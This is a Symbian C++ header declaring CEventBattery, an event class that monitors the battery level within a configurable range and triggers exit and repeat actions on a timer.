/*
 * EventBattery.h
 *
 *  Created on: 27/set/2010
 *      Author: Giovanna
 */

#ifndef EVENTBATTERY_H_
#define EVENTBATTERY_H_

#include "AbstractEvent.h"
#include <HT\Phone.h>
#include <HT\Logging.h>
#include <HT\TimeOutTimer.h>

typedef struct TBatteryStruct 
	{
	TInt iExitAction;	// action triggered when exiting range
	TInt iRepeatAction;
	TInt iIter;
	TInt iDelay;
	TInt	iMinLevel;		// min range level (0..100)
	TInt	iMaxLevel;		// max range level (0..100)
	TBatteryStruct()
		{
		iRepeatAction = -1;
		iIter = -1;
		iDelay = -1;
		iExitAction = -1;
		iMinLevel = 10;
		iMaxLevel = 90;
		}
	}TBatteryStruct;

/**
 *  CEventBattery
 * 
 */
class CEventBattery : public CAbstractEvent, public MPhoneObserver, public MTimeOutNotifier
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CEventBattery();

	/**
	 * Two-phased constructor.
	 */
	static CEventBattery* NewL(const TDesC8& params, TUint32 aTriggerId);

	/**
	 * Two-phased constructor.
	 */
	static CEventBattery* NewLC(const TDesC8& params, TUint32 aTriggerId);

protected:
	// From CAbstractEvent
	/**
	 * Events MUST implement this method to start their task.
	 */
	virtual void StartEventL();
	/**
	 * Events MUST implement this method to stop their task.
	 */
	virtual void StopEventL();

private:
	// From MPhoneObserver
	virtual void HandlePhoneEventL(TPhoneFunctions event);

	/**
	 * Checks if the device is currently Connected to charger
	 */
	TBool InRange();

	/**
	 * Constructor for performing 1st stage construction
	 */
	CEventBattery(TUint32 aTriggerId);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
	// From MTimeOutNotifier
	virtual void TimerExpiredL(TAny* src);
		
private:
	TBool iWasInRange;
	CPhone* iPhone;
	TBatteryStruct iBatteryParams;
	CTelephony::TBatteryInfoV1Pckg iBatteryInfoPckg;
	CTelephony::TBatteryInfoV1 iBatteryInfo; 			// Battery Info
	
	// timer for repeat action
	CTimeOutTimer* iTimerRepeat;
	TTime iTimeAtRepeat;
	TTimeIntervalSeconds iSecondsIntervRepeat;
	TInt iSteps;
		
	__FLOG_DECLARATION_MEMBER
		
	};


#endif /* EVENTBATTERY_H_ */
